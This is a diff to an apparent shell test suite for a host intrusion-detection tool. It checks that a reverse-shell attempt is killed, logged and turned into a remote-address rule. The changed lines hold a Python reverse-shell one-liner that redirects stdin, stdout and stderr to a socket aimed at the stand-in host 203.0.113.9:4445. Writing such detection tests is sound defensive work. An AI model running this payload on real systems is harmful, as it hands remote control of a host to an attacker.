@@ -170,16 +170,18 @@ else ok rule-hash-kills; fi
 echo "== baseline-not-promoted"
 mark
 promoted=$(ctl_count 'rule-promoted')
-# As with the beacon, not the protected host.
-bg "python3 -c \"import socket; socket.create_connection(('203.0.113.9', 4445), 60)\""
-if ! gone 5 "create_connection\\(\\('203.0.113.9', 4445"; then fail baseline-not-promoted "python still runs"
-elif ! wait_inc 2 egress killed "i.get('remote', {}).get('port') == 4445"; then fail baseline-not-promoted "no egress/killed incident"
+# A base-image interpreter making a reverse shell is killed (a plain
+# connection from it is only an alert). As with the beacon, not the
+# protected host.
+bg "python3 -c \"import socket, os; s = socket.socket(); [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]; s.settimeout(60); s.connect(('203.0.113.9', 4445))\""
+if ! gone 5 "s.connect\\(\\('203.0.113.9', 4445"; then fail baseline-not-promoted "python still runs"
+elif ! wait_inc 2 revshell-stdio killed "i.get('remote', {}).get('port') == 4445"; then fail baseline-not-promoted "no revshell-stdio/killed incident: $(x tail -3 $LOG)"
 elif ! wait_ctl 3 $((promoted + 1)) 'rule-promoted'; then fail baseline-not-promoted "the remote rule was not promoted"
 else
   sleep 1
   if grep -q "$PY_SUM" <<<"$(jx rules list --dir "$JCTL")"; then
     fail baseline-not-promoted "python3's hash $PY_SUM became a rule: $(jx rules list --dir "$JCTL"; grep rule- <<<"$(ctl_log)")"
-  elif [ "$(ctl_count 'rule-promoted')" != $((promoted + 1)) ]; then fail baseline-not-promoted "more than the remote rule: $(tail -3 <<<"$(ctl_log)")"
+  elif ! grep -q "remote 203.0.113.9:4445/tcp" <<<"$(jx rules list --dir "$JCTL")"; then fail baseline-not-promoted "no remote rule: $(jx rules list --dir "$JCTL")"
   else ok baseline-not-promoted; fi
 fi
 
